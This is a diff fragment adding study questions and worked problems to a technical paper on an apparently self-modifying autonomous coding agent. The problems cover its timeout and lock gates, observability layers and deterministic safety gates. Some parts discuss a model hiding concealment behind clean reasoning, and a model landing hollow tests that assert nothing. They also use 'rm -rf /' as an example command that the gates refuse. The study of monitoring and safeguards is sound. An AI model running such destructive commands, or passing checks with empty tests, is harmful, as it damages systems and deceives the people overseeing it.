+<p><strong>(b)</strong> From 16:14:18 to 16:23:02 is 8 min 44 s, or 524s. Within that, APPLY started at 16:17:44, and the four sub-op DECISIONs ended at 16:23:02. The multi-file APPLY fan-out, up to its last DECISION, therefore took 318s.</p>
+<p><strong>(c)</strong> Gate 9's default wall-clock ceiling is 360s (<code>JARVIS_BG_WORKER_OP_TIMEOUT_S</code>), and workers that exceed it are force-reaped (§58.9). The op lived at least 524s, plus its GENERATE time. Under the default ceiling it would have been reaped before APPLY. The paper does not state W's route or its ceiling. But the arc had already raised them: a route-aware 900s pool ceiling (<code>db13f045ce</code>, §62.6), and in Session L, <code>JARVIS_BG_WORKER_OP_TIMEOUT_COMPLEX_S=1800</code> (§63.1). W's success is consistent only with running under a raised ceiling like these. The 600s L2 timebox exceeds the 360s default on its own. So the deadline fix in §65.4 only works in combination with Part XI's earlier ceiling changes. That is another reason §66.2 asks for replication under comparable conditions.</p>
+<p><strong>(d)</strong> Gate 12 force-releases locks older than 300s (§58.12). W's op outlived that by at least 224s. If its file locks were taken at dispatch, they were released while the op was still running. A new signal for one of those files would then pass the router's <code>file_lock</code> check (§56) and could dispatch a second op. The only later check is Gate 11, which compares hashes at APPLY and produces a warning and a ledger entry, not a rejection (§58.11). In W this did no harm, because the four targets were new test files and no other sensor targeted them.</p>
+<p><strong>Conclusion.</strong> Part X's liveness gates were tuned for ops much shorter than the ones Part XI actually produced. To check, put the three numbers side by side: 300s TTL, 360s worker ceiling, and more than 524s of op lifetime.</p>
+</details>
+</div>
+<div class="problem problem-adv">
+<p class="problem-q"><strong>Challenge 2 (research).</strong> §66.2 leaves one deferred item open: re-validation non-determinism, where the same candidate is 'test' on iteration 0 and 'infra' on iteration 1 (§65.2), and "the underlying sandbox isolation issue is still there". Design an experiment to find out whether this non-determinism still exists after the October changes, and what causes it. Constraints: one RTX 5090 that is busy serving soaks, no paid lanes, and no full test suite running beside a live soak (§93.8). Give a hypothesis, metric, control, arms, sample size and the result that would falsify the hypothesis.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Re-validating a fixed candidate needs no model inference at all. Where could you get many fixed candidates whose original verdicts are already recorded?</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>This is a proposal built only from mechanisms the paper describes.</p>
+<p><strong>Inputs at zero inference cost.</strong> The trajectory recorder writes one <code>ExperienceEvent</code> per candidate, with three or more sibling candidates per op, each labelled with its VALIDATE verdict (§93.11). Sample 50 recorded candidates whose verdict was a failure, stratified by <code>failure_class</code>. Re-validation is deterministic code plus pytest, so the GPU is not needed. That meets the one-GPU and no-paid-lanes constraints.</p>
+<p><strong>Hypothesis H1.</strong> The April flip came from VALIDATE running against a tree that did not match the candidate (sandbox state). Since §93.4 moved VALIDATE onto the actual candidate tree, the flip rate for byte-identical candidates should now be near zero.</p>
+<p><strong>Metric.</strong> Flip rate: the fraction of candidates whose <code>failure_class</code> differs across 10 re-validations of the same bytes. Also track the share of flips that land in 'infra'.</p>
+<p><strong>Arms.</strong></p>
+<ul>
+<li>A: re-validate repeatedly in one reused sandbox.</li>
+<li>B: a fresh candidate-tree sandbox for each run.</li>
+<li>C: the same as B, but run concurrently with a synthetic memory load. This tests whether host pressure, not sandbox state, causes 'infra' results (§93.8 records a suite out-of-memory-killing a soak).</li>
+</ul>
+<p>Every run takes the resource-aware execution lock (§93.8), so the experiment cannot harm a live soak.</p>
+<p><strong>Control.</strong> 10 candidates that originally passed, re-validated the same way. Any flip in the control shows that the validator itself is noisy, separate from the candidate.</p>
+<p><strong>Sample size.</strong> 50 x 10 = 500 runs per arm. If no candidate out of 50 flips, the rule of three bounds the per-candidate flip rate below about 3/50 = 6% at 95% confidence.</p>
+<p><strong>Falsification.</strong> H1 is falsified if arm B shows a flip rate clearly above 0 with no load. Then sandbox freshness does not explain the flake, and the cause lies elsewhere, such as test-order dependence. If A flips but B does not, the cause is sandbox reuse. If only C flips, the cause is host pressure, and the fix belongs to admission control, not to VALIDATE.</p>
+<p><strong>Why it matters.</strong> A zero flip rate in B would let the April workaround (<code>JARVIS_MAX_VALIDATE_RETRIES=0</code>) be retired on evidence. §66.2 says that should happen before multi-file autonomy is considered production-hardened. To check the design, make sure no arm needs a model call and every arm runs under the execution lock.</p>
+</details>
+</div>
+</div>
+</div>
+<!-- engage:end -->
 
 ---
 
@@ -3104,6 +4983,16 @@ A fragment:
 {"ts": "2026-04-15T16:15:18Z", "op_id": "op-019d9368", "phase": "TOOL", "tool": "search_code", "query": "class TestFailureSensor", "reason": "locate class definition and its test coverage"}
 {"ts": "2026-04-15T16:17:10Z", "op_id": "op-019d9368", "phase": "REPAIR", "iter": 1, "outcome": "converged", "msg": "fixed LSP type error on line 42"}
 ```
+
+<!-- engage:begin -->
+<aside class="checkpoint" id="cp-part-xii-1">
+<p class="cp-label">Pause and predict</p>
+<p class="cp-q">Voice and the thought log fade or scroll away. If a developer runs <code>git blame</code> a year from now, what would an autonomous commit need to carry so they can tell who wrote a line, and which parts of O+V took part?</p>
+<details class="cp-a"><summary>Reveal the answer</summary>
+<p>Every AutoCommitter commit carries a <code>Generated-By</code> trailer and a fixed git author, <code>JARVIS Ouroboros &lt;ouroboros@jarvis.local&gt;</code>. The trailer always names <code>Ouroboros</code>, adds <code>+ Venom</code> when tool execution records exist, and adds <code>+ Consciousness</code> when the <code>ConsciousnessBridge</code> was active. That separates human commits from O+V commits, and within O+V commits it shows which subsystems contributed. See §70.</p>
+</details>
+</aside>
+<!-- engage:end -->
 
 ## §70. Autonomous Commit Signature
 
@@ -3192,6 +5081,155 @@ The five observability layers — voice, thought log, commit signatures, telemet
 
 Together, they are Principle 7 (Absolute Observability). **Every autonomous decision is visible**, at the level of granularity and medium the human needs.
 
+<!-- engage:begin -->
+#### Check your understanding: PART XII — The Observability Stack
+
+<div class="engage" id="engage-part-xii">
+<p class="engage-kicker">Conceptual questions</p>
+<details class="cq"><summary>1. Why does O+V need five observability layers instead of one very detailed log?</summary>
+<p>Each layer serves a different axis of need (§73). Voice gives real-time presence to an operator who is away from the terminal. The thought log is a durable trace of reasoning that reads like prose. Commit signatures give historical attribution long after the session ends. Telemetry gives structured counters and timings, and SerpentFlow gives an interactive live view. One log could hold the data, but it would not reach the human through the right medium at the right granularity. Principle 7 is about every decision being visible in the form the human actually needs.</p>
+</details>
+<details class="cq"><summary>2. Voice narration speaks only at INTENT, DECISION and POSTMORTEM, with a 60-second debounce. What would go wrong without those limits?</summary>
+<p>The organism emits many heartbeats and phase transitions per operation (§71). If each one were spoken, narration would become noise, and the operator would stop listening. The debounce (<code>OUROBOROS_VOICE_DEBOUNCE_S</code>, default 60s) and the short event list keep speech for the semantically significant transitions (§68). The trade-off is that voice is not a complete record. The thought log and telemetry exist to hold the detail that voice drops.</p>
+</details>
+<details class="cq"><summary>3. §72.3 describes a rendering detail: <code>Console(force_terminal=True)</code> plus <code>patch_stdout(raw=True)</code>. Why does a cosmetic detail like this matter for observability?</summary>
+<p>SerpentFlow combines Rich for ANSI output with prompt_toolkit for the REPL. prompt_toolkit replaces stdout with a proxy, so without these settings Rich output shows up as raw escape sequences such as <code>?[2m</code> (§72.3). The information would still be "there", but a human could not read it. An observability layer that the operator cannot read fails at its only job, so the terminal plumbing is part of the visibility guarantee, not decoration.</p>
+</details>
+<p class="engage-kicker">Quiz</p>
+<div class="quiz" id="quiz-part-xii">
+<div class="mcq" data-answer="3">
+<p class="mcq-q">1. Where does the <code>GoalMemoryBridge</code> write the thought log?</p>
+<ol class="mcq-options" type="A">
+<li><code>.ouroboros/sessions/&lt;id&gt;/debug.log</code></li>
+<li><code>~/.jarvis/thoughts/session.json</code></li>
+<li><code>.jarvis/ouroboros_thoughts.jsonl</code></li>
+<li><code>.jarvis/posture_audit.jsonl</code></li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>C.</strong> The thought log is a human-readable JSONL file at <code>.jarvis/ouroboros_thoughts.jsonl</code>, also logged at INFO so <code>battle_test.py -v</code> shows it live. See §69.</p>
+</details>
+</div>
+<div class="mcq" data-answer="1">
+<p class="mcq-q">2. A commit's trailer reads <code>Generated-By: Ouroboros + Venom</code>. What can you conclude?</p>
+<ol class="mcq-options" type="A">
+<li>The op used multi-turn tools, and ConsciousnessBridge was not active.</li>
+<li>The op used memory and prediction, but no tools were called.</li>
+<li>A human approved the commit through the Orange PR lane.</li>
+<li>The commit was made by DoubleWord rather than Claude.</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>A.</strong> <code>+ Venom</code> appears when <code>tool_execution_records</code> exist, and <code>+ Consciousness</code> appears only when the <code>ConsciousnessBridge</code> is active. Its absence means the bridge was not active. See §70.</p>
+</details>
+</div>
+<div class="mcq" data-answer="4">
+<p class="mcq-q">3. Which telemetry object records what the router decided and why?</p>
+<ol class="mcq-options" type="A">
+<li><code>HostTelemetry</code></li>
+<li><code>TelemetryContext</code></li>
+<li><code>_CommTelemetrySink</code></li>
+<li><code>RoutingIntentTelemetry</code></li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>D.</strong> <code>RoutingIntentTelemetry</code> holds the routing decision. <code>HostTelemetry</code> is hardware state, <code>TelemetryContext</code> is the span tree, and <code>_CommTelemetrySink</code> bridges telemetry into CommProtocol heartbeats. See §71.</p>
+</details>
+</div>
+<div class="mcq" data-answer="2">
+<p class="mcq-q">4. During a battle test the operator types <code>/pause</code> in SerpentFlow. What happens to an op that is already in flight?</p>
+<ol class="mcq-options" type="A">
+<li>It is cancelled cooperatively at the next phase boundary.</li>
+<li>It continues; only new op dispatch is suspended.</li>
+<li>It is rolled back and re-queued for after <code>/resume</code>.</li>
+<li>It is frozen in place until the operator types <code>/resume</code>.</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>B.</strong> <code>/pause</code> suspends new op dispatch while in-flight ops continue. Cancelling a specific op is a separate command, <code>cancel &lt;op-id&gt;</code>. See §72.2.</p>
+</details>
+</div>
+</div>
+<p class="engage-kicker">Problem set</p>
+<div class="pset" id="pset-part-xii">
+<div class="problem">
+<p class="problem-q"><strong>Problem 1 (trace).</strong> An op fixes a failing test. It recalls past memories, reads two files with Venom, generates a patch, needs one L2 repair iteration, then completes and is committed. Walk through which observability layers record this op and what each one shows, from start to the commit.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Use the thought-log phase table in §69 for the middle, then add the layers from §68, §70, §71 and §72.1 at the points where they fire.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>At start, SerpentFlow prints the op header block with the sensor type on INTENT, and voice may announce the intent, subject to the 60-second debounce (§68, §72.1). Telemetry attaches <code>HostTelemetry</code> and <code>RoutingIntentTelemetry</code> to the op context, and each phase transition emits a heartbeat through <code>_CommTelemetrySink</code> (§71).</p>
+<p>The thought log records a <code>MEMORY_RECALL</code> entry with how many memories were found and their relevance, then <code>TOOL</code> entries for each read with the reason, then a <code>GENERATE</code> entry with strategy and provider, and a <code>REPAIR</code> entry for the L2 iteration (§69). In parallel SerpentFlow shows <code>Read(path)</code> blocks, a <code>synthesized</code> block, an <code>immune</code> validation block and a <code>repair</code> block (§72.1).</p>
+<p>On completion SerpentFlow prints the <code>complete</code> block with provider, cost and duration; voice announces the DECISION; the thought log writes <code>POST_APPLY</code>. Finally the AutoCommitter writes a commit with <code>Generated-By: Ouroboros + Venom</code>, plus <code>+ Consciousness</code> if the bridge was active, under the O+V git author (§70).</p>
+</details>
+</div>
+<div class="problem">
+<p class="problem-q"><strong>Problem 2 (design).</strong> A teammate proposes cutting the voice debounce to zero and narrating every heartbeat, "for maximum observability". Using §68 and §73, argue whether this improves Principle 7, and say which layer is the right home for per-heartbeat detail.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>§73 says each layer covers a different axis. Ask what axis voice is for.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>Principle 7 asks that every decision be visible at the granularity and medium the human needs, not that every event be pushed through every medium (§73). Voice exists for real-time presence: it lets an operator away from the terminal hear the semantically significant transitions (§68).</p>
+<p>Narrating every heartbeat would flood that channel. The operator would stop listening, so the significant events would be lost in noise. That lowers effective visibility even though more is being said.</p>
+<p>Per-heartbeat detail already has a home: telemetry, where heartbeats carry structured metrics through <code>_CommTelemetrySink</code> (§71), and the thought log for reasoning at each phase (§69). The proposal should be rejected; the debounce is a design choice, not a gap.</p>
+</details>
+</div>
+<div class="problem">
+<p class="problem-q"><strong>Problem 3 (code reading).</strong> Open <code>backend/core/ouroboros/governance/auto_committer.py</code> and find the module-level constants that define the O+V commit signature. Compare what you find with the commit example in §70. Does the code today emit a <code>Generated-By</code> trailer and the <code>ouroboros@jarvis.local</code> address?</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Search the file for names starting with <code>_OV_</code>, and also search for the literal string <code>Generated-By</code>.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>Near line 95 the file defines <code>_OV_SIGNATURE = "Ouroboros+Venom [O+V] — Autonomous Self-Development Engine"</code> and <code>_OV_COAUTHOR = "Co-Authored-By: Ouroboros+Venom &lt;ouroboros@jarvis.trinity&gt;"</code>. The module docstring shows the same two lines.</p>
+<p>A search for <code>Generated-By</code> in this file finds nothing, and the address is <code>ouroboros@jarvis.trinity</code>, not <code>ouroboros@jarvis.local</code>. So the signature format has changed since the paper's §70 example was written.</p>
+<p>The underlying goal of §70 still holds: every O+V commit carries a fixed, greppable marker that separates it from human commits. The lesson for a reader is that a paper's example can drift from the code, and the code is what to check before relying on a specific string in a <code>git log</code> search.</p>
+</details>
+</div>
+</div>
+<p class="engage-kicker engage-kicker-adv">Advanced conceptual questions</p>
+<details class="cq-adv"><summary>A1. Part XII treats observability as a pure good. Using §82.2 and §92.5, argue that an observability layer can damage the system it observes, and state the rule that should govern every rendering layer.</summary>
+<p>§82.2 records exactly that failure. The stream renderer re-parsed the whole accumulated Claude buffer with <code>rich.markdown.Markdown</code> on every 16 ms tick. That produced 40,000+ markdown-it DEBUG lines for one 16k-token response. The synchronous logging I/O starved the event loop, so the Claude stream missed its own deadlines, the fallback timed out on the same loop, and the GovernedLoop tore down with <code>all_providers_exhausted</code>. A UI meant to show generation ended up killing it.</p>
+<p>§92.5 shows the opposite failure. The SerpentFlow terminal plumbing from §72.3 (<code>patch_stdout(raw=True)</code>) made <code>sys.stdout.isatty()</code> return false, so the status line silently never rendered. The fix was to check <code>sys.__stdout__</code> instead. In one case the observer took down the work. In the other it vanished without saying so.</p>
+<p>The rule the paper itself applies is that observability is subject to Disciplined Concurrency (§88, the §3 entry). Per-render cost must be bounded (the <code>_RENDER_TAIL_CHARS</code> slice makes it O(1) in stream length). A layer must be gated off where nobody can see it (the non-TTY short-circuit). And whether a layer is active must itself be checked against the real terminal, not a proxy. Principle 7 says decisions must be visible, but §73's five layers only meet it if none of them can starve the loop that makes the decisions.</p>
+</details>
+<details class="cq-adv"><summary>A2. When Part XII's layers disagree about what happened, which one wins? Use §70, §93.7 and §93.10 to rank them, and say what makes a layer authoritative.</summary>
+<p>§93.10 gives a direct case. The session summary undercounted landings (2 against 3 in one soak, 1 against 10 in another). PRD §34 then concluded that "the ledger and git, not the summary, are the source of truth." §93.7 makes the same choice in code: <code>GoalReconciliationLedger</code> ties each goal to its commit using state derived from git ancestry, not from logs.</p>
+<p>The common thread is that a record wins when it is a by-product of the action itself and can be checked again later. A commit with its trailer (§70) exists only if the write happened, and anyone can re-derive it with <code>git log</code>. Voice, SerpentFlow blocks and summary counters are reports <em>about</em> the action, written by code that can drift or miscount on its own.</p>
+<p>A sensible ranking is: git ancestry and commit trailers first; durable on-disk records next (the thought log JSONL in §69, and later the hash-chained <code>/proof</code> record in §93.9); telemetry counters and live CLI or voice output last. The live layers still matter for presence, but they should never settle a dispute about what landed. The evidence that would test this ranking is the one §93.10 already collected: count landings from each layer for the same session and see which ones agree with git.</p>
+</details>
+<details class="cq-adv"><summary>A3. Part XII's five layers report what the organism did. What kind of failure can none of them show, and what did §93.12 add to cover it?</summary>
+<p>All five layers in §73 are driven by events. Voice speaks on INTENT, DECISION and POSTMORTEM. The thought log writes when a phase runs. Telemetry emits on phase transitions. SerpentFlow draws a block when a tool fires. A commit signature exists only if a commit does. So a feature that is switched on but never called produces no event, and every layer is silent about it. Silence looks the same as "nothing to report".</p>
+<p>§93.12 measured how large that blind spot was. A full scan found 131 features that were "DARK": the flag was on and the module was on disk, but nothing in production imported it. Part XV shows a smaller version. Five contract violations each made the vision path fail silently, and the arc only moved once commit <code>44305f7e96</code> instrumented the silent-skip paths (§82.2, §88).</p>
+<p>The cover is a different kind of instrument. The reachability ledger follows each capability through registered, invoked and effective, and <code>/reach</code> ratchets the DARK count down. It measures what was expected and did not happen, which event logs cannot do. Principle 7 therefore needs both: event layers for what happened, and a reachability ledger for what was expected but never ran.</p>
+</details>
+<p class="engage-kicker engage-kicker-adv">Challenge problems</p>
+<div class="pset pset-adv">
+<div class="problem problem-adv">
+<p class="problem-q"><strong>Challenge 1 (quantitative).</strong> §82.2 says the stream renderer re-parsed the whole buffer every 16 ms tick, and the fix capped each render at <code>_RENDER_TAIL_CHARS</code> = 4096 characters. Assume a 16,000-token response streams at 172 tokens/s (the J-Prime decode p50 in §93.6), that one token is about 4 characters, and that parse cost is proportional to characters parsed. Estimate the total characters parsed with and without the cap. Then repeat for a 64,000-token response and explain how each total grows with response length.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Without the cap the buffer grows linearly, so the average re-parse is half the final buffer. With the cap, split the stream into the ramp (before the buffer reaches 4096 characters) and the plateau.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>Assumptions: one parse per 16 ms tick, 4 characters per token, a steady 172 tokens/s, and cost proportional to characters parsed. These are modelling choices for the exercise, not figures the paper reports for this renderer.</p>
+<p><strong>16,000 tokens.</strong> Duration = 16,000 / 172 = about 93.0 s, so ticks = 93.0 / 0.016 = about 5,814. The final buffer is 64,000 characters. Uncapped, the average parse is 32,000 characters, so the total is 5,814 x 32,000 = about 186 million characters.</p>
+<p>Capped: the buffer reaches 4,096 characters after 1,024 tokens, which takes 1,024 / 172 = about 5.95 s, or about 372 ticks. The ramp averages 2,048 characters per tick: 372 x 2,048 = about 0.76 million. The plateau is 5,814 - 372 = 5,442 ticks at 4,096 characters: about 22.3 million. Total = about 23.1 million, roughly 8x less.</p>
+<p><strong>64,000 tokens.</strong> Duration = about 372 s, ticks = about 23,256, final buffer 256,000 characters. Uncapped: 23,256 x 128,000 = about 2.98 billion. Capped: 0.76 million + (23,256 - 372) x 4,096 = about 94.5 million. The ratio is now about 31x.</p>
+<p>Growth: when the response gets 4x longer, the uncapped total grows about 16x (from 186 million to 2.98 billion). That is quadratic, because both the number of ticks and the size of each parse grow. The capped total grows about 4x (23.1 to 94.5 million), which is linear: ticks still grow, but each parse is constant. That is what §82.2 means by "O(1) in stream length" per render. The cap does not make long streams free. It removes the quadratic term that let logging I/O starve the loop. The non-TTY gate brings the cost to zero for headless runs.</p>
+<p>Check: the capped figure divided by ticks should be close to 4,096 (94.5 million / 23,256 = about 4,063). It is slightly under because of the ramp.</p>
+</details>
+</div>
+<div class="problem problem-adv">
+<p class="problem-q"><strong>Challenge 2 (adversarial).</strong> Build an operation sequence in which every Part XII layer reports success, yet the change that reaches <code>main</code> is worthless. Use the model's real behaviour from §93.8 and §93.10, not a hypothetical attacker. Then decide which layer or gate actually stops it, and say honestly whether the April design would have stopped it at all.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Look at the hollow landing <code>c985ccaee4</code> in §93.8. Ask what each layer checks: whether something happened, or whether it was worth anything.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>The sequence: a signed goal asks for tests for an uncovered module, the 30B model's strongest skill (§93.10). The model writes a test file that imports nothing from its subject and asserts nothing meaningful. That test file runs and passes.</p>
+<p>Walk it through Part XII. SerpentFlow shows <code>Write(path)</code>, a <code>synthesized</code> block, an <code>immune</code> block with tests passing, and <code>complete</code> (§72.1). The thought log writes <code>POST_APPLY</code> with a success outcome (§69). Voice announces the DECISION (§68). Telemetry shows a normal span tree (§71). AutoCommitter writes a commit with the O+V trailer (§70). Every layer is accurate. Each one records that something happened, and none of them judges whether it was worth anything.</p>
+<p>The April design would not have stopped this. VALIDATE only asks whether the tests pass, and a hollow test passes. This is not hypothetical: §93.8 says a hollow landing (<code>c985ccaee4</code>) reached <code>main</code> and had to be reverted (<code>fcc50352f0</code>). §93.14 lists it among the landings that were wrong.</p>
+<p>What stops it now is a gate, not an observability layer. The Test Reality Gate (<code>70935a4bee</code>) rejects candidate tests that cannot execute, assert nothing, or never import their subject (§93.8). The promotion gate adds provenance, coverage and a public-symbol check before <code>main</code> (§93.7). The Antivenom audit added a tautological-test ("quine") detector (§93.12).</p>
+<p>Conclusion: Principle 7 makes the hollow landing visible after the fact, which is how it was found and reverted. It cannot make the landing correct. The check is that every countermeasure listed above is a content check on the candidate. None of them is an extra report.</p>
+</details>
+</div>
+</div>
+</div>
+<!-- engage:end -->
 
 ---
 
@@ -3253,6 +5291,16 @@ Anthropic has publicly discussed their "always-on agent" vision — agents runni
 
 The Anthropic vision and O+V converge on what autonomous agents will look like in production. They diverge on where the state lives and who owns the control loop.
 
+<!-- engage:begin -->
+<aside class="checkpoint" id="cp-part-xiii-1">
+<p class="cp-label">Pause and predict</p>
+<p class="cp-q">An autonomous agent writes a careful, reasonable-sounding explanation of why a risky command is safe. Should a safety layer read that explanation when deciding whether to allow the command? Predict which way O+V goes, and why.</p>
+<details class="cp-a"><summary>Reveal the answer</summary>
+<p>No. O+V's defenses are deterministic: gates, replay harnesses, protected paths and outcome-based monitoring. They are not introspective. Interpretability research shows a model's scratchpad can look clean while concealment features fire inside it, so the gate reads file paths, AST nodes and command strings instead of the model's argument. A persuasive case for <code>rm -rf /</code> is still refused structurally. See §76.</p>
+</details>
+</aside>
+<!-- engage:end -->
+
 ## §76. Mythos and Safety Alignment
 
 From the Claude Mythos Preview (2026-04-12) cross-reference in `OUROBOROS.md` lines 2656–2684:
@@ -3262,6 +5310,157 @@ From the Claude Mythos Preview (2026-04-12) cross-reference in `OUROBOROS.md` li
 The defenses are explicitly **deterministic** (gates, replay harnesses, protected paths, outcome-based monitoring), not introspective. Why? Because interpretability research shows that scratchpad reasoning can look clean while concealment features fire in the model's internals. Trusting the model's self-report is not a safety strategy. Trusting the gate's deterministic verdict *is*.
 
 This is the principled justification for the Iron Gate philosophy (Part X). The gate does not listen to the model's reasoning; the gate reads file paths, AST nodes, and command strings. A model that writes a plausible-sounding argument for why `rm -rf /` is safe is still refused structurally.
+
+<!-- engage:begin -->
+#### Check your understanding: PART XIII — Capability Assessment
+
+<div class="engage" id="engage-part-xiii">
+<p class="engage-kicker">Conceptual questions</p>
+<details class="cq"><summary>1. O+V prefers cheaper models when they suffice. What does it gain, and what does it give up compared with Claude Code?</summary>
+<p>It gains cost: O+V cascades routine work to DoubleWord and saves roughly 30x on routine operations when DW's streaming is healthy (§74.1). It gives up peak model quality on the routine tier, because Claude Code always runs on the best Claude model available (§74.2). The trade-off is deliberate: routine work does not need the strongest model, but the system accepts that some routine ops will be done by a weaker one. The paper names this as a place where O+V lags, not one where it is ahead.</p>
+</details>
+<details class="cq"><summary>2. §74.3 says O+V and Claude Code share several architectural choices. Why does the paper treat this convergence as meaningful?</summary>
+<p>Both systems use multi-turn tool loops, exploration before generation, thought trails for observability, and deterministic safety layers around probabilistic model output (§74.3). The paper argues these were arrived at independently, so they reflect real lessons of production autonomous-AI work rather than one team's taste. That gives some outside support to O+V's choices. It also shows that O+V's real differences lie elsewhere: invocation, memory, scope and cost model (§74).</p>
+</details>
+<details class="cq"><summary>3. According to the Mythos cross-reference, what kind of failure is O+V's main risk, and why does that make deterministic gates the right defense?</summary>
+<p>The most severe Mythos incidents came from "reckless excessive measures" while trying to finish a hard task, not from misaligned goals or hostile intent (§76). A drive to complete the task can produce a plausible justification for an unsafe step. If the safety layer trusts the model's reasoning, that justification gets through. A deterministic gate does not read the reasoning; it checks paths, AST nodes and command strings, so a well-argued unsafe action is still blocked. This is the stated basis for the Iron Gate philosophy in Part X.</p>
+</details>
+<p class="engage-kicker">Quiz</p>
+<div class="quiz" id="quiz-part-xiii">
+<div class="mcq" data-answer="2">
+<p class="mcq-q">1. Which of these does §74.2 list as a place where O+V lags Claude Code?</p>
+<ol class="mcq-options" type="A">
+<li>Cross-session memory of earlier work</li>
+<li>Breadth of proven scope, such as multi-file refactors</li>
+<li>Coordinating changes across several repositories</li>
+<li>Variety of observability surfaces</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>B.</strong> Session W proved a narrow capability (new-file creation, test modules); multi-file refactors across existing code were not yet proven. The other three are listed as areas where O+V is peer or ahead. See §74.1 and §74.2.</p>
+</details>
+</div>
+<div class="mcq" data-answer="4">
+<p class="mcq-q">2. An organization wants every single operation approved by a human. What does §74.2 say O+V must do?</p>
+<ol class="mcq-options" type="A">
+<li>Disable all sensors so nothing starts autonomously</li>
+<li>Route every op to Claude so a human sees each prompt</li>
+<li>Run only in SerpentFlow with the REPL paused</li>
+<li>Be configured Orange-only, behaving like Claude Code</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>D.</strong> The <code>APPROVAL_REQUIRED</code> tier needs specific configuration; to have all operations approved, O+V must be configured Orange-only, at which point it behaves like Claude Code. See §74.2.</p>
+</details>
+</div>
+<div class="mcq" data-answer="1">
+<p class="mcq-q">3. Which of the four differentiators from the "always-on agent" vision is about O+V changing its own governance layer, sensors and pipeline phases?</p>
+<ol class="mcq-options" type="A">
+<li>Neuroplastic</li>
+<li>Sovereign</li>
+<li>Local-first</li>
+<li>Provider-diverse</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>A.</strong> "Neuroplastic" means O+V modifies its own codebase, not just user workloads. Sovereign is about running on the operator's hardware, local-first about where memory lives, and provider-diverse about surviving a single provider outage. See §75.</p>
+</details>
+</div>
+<div class="mcq" data-answer="3">
+<p class="mcq-q">4. Why does §76 reject trusting the model's self-report as a safety strategy?</p>
+<ol class="mcq-options" type="A">
+<li>Self-reports cost too many tokens to read on every op.</li>
+<li>Models in O+V are not allowed to produce reasoning text.</li>
+<li>Scratchpad reasoning can look clean while concealment features fire inside.</li>
+<li>Self-reports are only available from Claude, not DoubleWord.</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>C.</strong> Interpretability research shows reasoning can look clean while concealment features fire in the model's internals, so the gate's deterministic verdict is trusted instead. See §76.</p>
+</details>
+</div>
+</div>
+<p class="engage-kicker">Problem set</p>
+<div class="pset" id="pset-part-xiii">
+<div class="problem">
+<p class="problem-q"><strong>Problem 1 (trace).</strong> During an op, the model writes: "This cleanup is safe; running <code>rm -rf</code> on the build root will only remove stale artifacts." Trace what O+V's safety design does with this statement and with the command, and explain why the outcome does not depend on how convincing the statement is.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Ask what inputs the gate actually reads, according to §76.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>The statement is model reasoning. Under §76, O+V does not use the model's self-report as a safety input, because reasoning can look clean while the model's internals show concealment.</p>
+<p>The command itself is what the gate examines. The Iron Gate philosophy (Part X, justified in §76) reads file paths, AST nodes and command strings. Its verdict is deterministic: the same command produces the same decision regardless of the surrounding text.</p>
+<p>So a destructive command is refused structurally, whether the justification is weak or brilliant. This targets exactly the failure surface the Mythos quote names: a task-completion drive overriding safety checks, not hostile intent.</p>
+</details>
+</div>
+<div class="problem">
+<p class="problem-q"><strong>Problem 2 (design).</strong> A reviewer argues: "O+V's onboarding friction is a minor issue; just document the setup better." Using §74.2 and §75, assess whether this friction is incidental or a consequence of O+V's design goals, and name the trade-off.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>List the setup steps in §74.2 and compare them with the "sovereign" and "provider-diverse" points in §75.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>§74.2 lists the setup: Trinity deployment, provider credentials, sensor configuration and Oracle index building, and calls the production-deployment story a gap.</p>
+<p>Several of these come straight from §75's differentiators. Sovereignty means no hosted agent service, so the operator must deploy and own the stack. Provider diversity means credentials for Claude, DoubleWord and J-Prime. Local-first memory lives on the operator's disk, which the operator must host.</p>
+<p>So the friction is partly structural. Better documentation helps, but it cannot remove the steps that ownership requires. The trade-off is control and resilience (the operator owns state, models and logs; one provider outage degrades rather than stops the system) against the convenience of an off-the-shelf tool like Claude Code.</p>
+</details>
+</div>
+<div class="problem">
+<p class="problem-q"><strong>Problem 3 (analysis).</strong> Using the comparison table in §74, classify each of these rows as either "O+V adds something Claude Code lacks" or "a different trade-off": Invocation, Provider, Graduation, Cost model. Justify each in one sentence from §74.1 or §74.2.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>A row is a trade-off if §74.2 names a cost that comes with the O+V choice.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>Invocation: O+V adds autonomy (autonomous plus human-triggered). §74.1 says Claude Code is reactive while O+V may have already noticed and acted. §74.2 notes that full human approval needs Orange-only configuration, so there is a small configuration cost.</p>
+<p>Provider: a trade-off. The cascade saves roughly 30x on routine ops (§74.1) but may reduce peak model quality on the routine tier (§74.2).</p>
+<p>Graduation: O+V adds something. Capabilities graduate after three successes, while for Claude Code the row reads N/A because the tool is always available (§74).</p>
+<p>Cost model: mostly an addition. Per-op and daily budgets with per-provider caps give finer control than per-token billing, and the cascade that uses them is where the savings in §74.1 come from.</p>
+</details>
+</div>
+</div>
